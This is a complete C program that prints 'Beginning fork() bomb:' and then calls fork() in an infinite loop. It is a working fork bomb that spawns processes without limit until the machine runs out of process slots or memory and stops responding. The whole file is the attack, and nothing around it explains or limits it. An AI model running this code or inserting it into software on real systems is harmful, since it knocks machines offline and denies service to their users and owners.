#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main()
{
    printf("Beginning fork() bomb: \n");
	while(1) {
        fork();
    }
}
